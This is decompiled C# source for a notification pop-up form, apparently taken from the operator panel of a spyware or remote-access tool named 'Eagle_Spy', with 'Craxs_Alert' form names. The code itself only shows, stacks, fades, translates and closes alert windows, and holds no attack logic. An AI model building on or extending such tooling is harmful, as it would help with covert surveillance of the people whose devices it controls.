using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy
{
	// Token: 0x02000013 RID: 19
	[DesignerGenerated]
	public partial class alertform : Form
	{
		// Token: 0x17000172 RID: 370
		// (get) Token: 0x060001B9 RID: 441 RVA: 0x00002500 File Offset: 0x00000700
		protected override bool ShowWithoutActivation
		{
			get
			{
				return true;
			}
		}

		// Token: 0x060001BA RID: 442
		[DllImport("user32.dll", SetLastError = true)]
		private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int x, int y, int cx, int cy, uint uFlags);

		// Token: 0x060001BB RID: 443 RVA: 0x00002503 File Offset: 0x00000703
		protected override void OnLoad(EventArgs e)
		{
			base.OnLoad(e);
			alertform.SetWindowPos(base.Handle, new IntPtr(-1), base.Left, base.Top, base.Width, base.Height, 80U);
		}

		// Token: 0x060001BE RID: 446
		[DllImport("user32.dll")]
		private static extern bool SetWindowPos(int hWnd, int hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

		// Token: 0x060001BF RID: 447
		[DllImport("user32.dll")]
		private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		// Token: 0x060001C0 RID: 448 RVA: 0x0000D730 File Offset: 0x0000B930
		public static void ShowInactiveTopmost(Form frm)
		{
			alertform.ShowWindow(frm.Handle, 4);
			alertform.SetWindowPos(frm.Handle.ToInt32(), -1, frm.Left, frm.Top, frm.Width, frm.Height, 16U);
		}

		// Token: 0x060001C1 RID: 449 RVA: 0x0000D77C File Offset: 0x0000B97C
		[DebuggerStepThrough]
		private void FadeIn(Form o, int interval = 45)
		{
			alertform.VB_0024StateMachine_39_FadeIn vb_0024StateMachine_39_FadeIn = new alertform.VB_0024StateMachine_39_FadeIn();
			vb_0024StateMachine_39_FadeIn._0024VB_0024Me = this;
			vb_0024StateMachine_39_FadeIn._0024VB_0024Local_o = o;
			vb_0024StateMachine_39_FadeIn._0024VB_0024Local_interval = interval;
			vb_0024StateMachine_39_FadeIn._0024State = -1;
			vb_0024StateMachine_39_FadeIn._0024Builder = AsyncVoidMethodBuilder.Create();
			vb_0024StateMachine_39_FadeIn._0024Builder.Start<alertform.VB_0024StateMachine_39_FadeIn>(ref vb_0024StateMachine_39_FadeIn);
		}

		// Token: 0x060001C2 RID: 450 RVA: 0x00002557 File Offset: 0x00000757
		public alertform(string msg)
		{
			base.Load += this.AlertForm_Load;
			this.components = null;
			this.counter = 1;
			this.hold = 50;
			this.InitializeComponent();
			this.TheMessage = msg;
		}

		// Token: 0x060001C3 RID: 451 RVA: 0x0000D7C4 File Offset: 0x0000B9C4
		private void AlertForm_Load(object sender, EventArgs e)
		{
			base.Opacity = 0.0;
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "CN", false) != 0)
			{
				if (Operators.CompareString(language, "AR", false) == 0)
				{
					this.TheMessage = Codes.Translate(this.TheMessage, "en", "ar");
				}
			}
			else
			{
				this.TheMessage = Codes.Translate(this.TheMessage, "en", "zh");
			}
			this.msglabel.Text = this.TheMessage;
			this.workingArea = Screen.GetWorkingArea(this);
			checked
			{
				this.oldY = this.workingArea.Bottom - base.Size.Height - 10;
				int num = 1;
				do
				{
					try
					{
						string text = "Craxs_Alert_" + Conversions.ToString(num);
						if ((alertform)Application.OpenForms[text] == null)
						{
							base.Name = text;
							break;
						}
						this.oldY = this.workingArea.Bottom - base.Size.Height - 10 - base.Height * num;
					}
					catch (Exception)
					{
					}
					num++;
				}
				while (num <= 99);
				base.Location = new Point(this.workingArea.Right - base.Size.Width, this.oldY);
				alertform.ShowInactiveTopmost(this);
				this.FadeIn(this, 45);
			}
		}

		// Token: 0x060001C4 RID: 452 RVA: 0x0000D934 File Offset: 0x0000BB34
		private void Closetimer_Tick(object sender, EventArgs e)
		{
			checked
			{
				try
				{
					if (DateTime.Compare(this.Showtime, DateTime.Now) < 0)
					{
						base.Opacity = 0.0;
						this.closetimer.Stop();
						this.closetimer.Dispose();
						base.Close();
					}
					else if (this.hold == 0)
					{
						base.Name = "ended";
						this.workingArea = Screen.GetWorkingArea(this);
						base.Location = new Point(this.workingArea.Right - base.Size.Width, this.oldY - this.counter);
						this.counter++;
						unchecked
						{
							base.Opacity -= 0.05;
						}
					}
					else
					{
						this.hold--;
					}
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x060001C5 RID: 453 RVA: 0x00002594 File Offset: 0x00000794
		private void PictureBox2_Click(object sender, EventArgs e)
		{
			this.closetimer.Stop();
			this.closetimer.Dispose();
			base.Close();
		}

		// Token: 0x060001C6 RID: 454 RVA: 0x00002594 File Offset: 0x00000794
		private void Lidlamb_MouseDown(object sender, MouseEventArgs e)
		{
			this.closetimer.Stop();
			this.closetimer.Dispose();
			base.Close();
		}

		// Token: 0x060001C7 RID: 455 RVA: 0x000025B2 File Offset: 0x000007B2
		private void Lidlamb_MouseUp(object sender, MouseEventArgs e)
		{
			this.closetimer.Start();
		}

		// Token: 0x04000048 RID: 72
		private const uint SWP_SHOWWINDOW = 64U;

		// Token: 0x04000049 RID: 73
		public string TheMessage;

		// Token: 0x0400004A RID: 74
		public int oldY;

		// Token: 0x0400004B RID: 75
		public Rectangle workingArea;

		// Token: 0x0400004C RID: 76
		public DateTime Showtime;

		// Token: 0x0400004D RID: 77
		private const int SW_SHOWNOACTIVATE = 4;

		// Token: 0x0400004E RID: 78
		public const int HWND_TOPMOST = -1;

		// Token: 0x0400004F RID: 79
		private const uint SWP_NOACTIVATE = 16U;

		// Token: 0x04000050 RID: 80
		private int counter;

		// Token: 0x04000051 RID: 81
		private int hold;
	}
}
